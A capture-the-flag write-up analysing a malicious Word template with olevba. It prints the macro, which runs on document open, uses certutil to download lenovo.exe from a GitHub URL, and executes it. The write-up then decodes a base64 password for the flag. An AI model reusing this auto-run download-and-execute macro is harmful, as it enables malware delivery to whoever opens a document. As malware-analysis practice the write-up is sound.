# Resign Letter

In this challenge, we were given a .rar file containing a .dotm resign letter template. When attempting to open the ```.dotm``` file, a warning about potential macros containing viruses appeared. The document itself contained only meaningless text. To analyze the embedded macros, we used the olevba tool with the following command:

```bash
$ olevba --decode Resign_letter_template/Resign\ letter\ template.dotm
```
```bash
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.12 - http://decalage.info/python/oletools
===============================================================================
FILE: /home/doq/Downloads/Resign_letter_template/Resign letter template.dotm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Test
End Sub

Private Sub Test()
Shell ("cmd /c certutil.exe -urlcache -split -f https://github.com/fareedfauzi/Adv_Sim/raw/main/lenovo.exe %temp%\lenovo.exe")
Shell ("cmd /c %temp%\lenovo.exe")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://github.com/f|URL                                          |
|          |areedfauzi/Adv_Sim/r|                                             |
|          |aw/main/lenovo.exe  |                                             |
|IOC       |certutil.exe        |Executable file name                         |
|IOC       |lenovo.exe          |Executable file name                         |
|Hex String|'\x00\x02\t\x06'    |00020906                                     |
|Hex String|'\x00\x00\x00\x00\x0|000000000046                                 |
|          |0F'                 |                                             |
+----------+--------------------+---------------------------------------------+

```
The output revealed a VBA macro that executed upon opening the document. The macro used certutil.exe to download and run a suspicious executable named ```lenovo.exe``` from a GitHub repository.

Upon downloading lenovo.exe, we examined its strings and discovered a command that created a user with the password ```cEBzczEyMw==```. This string was encoded in base64, and decoding it revealed the password: ```p@ss123```.

Thus, the flag for this challenge was:
##Flag
```RWSC{p@ss123}```
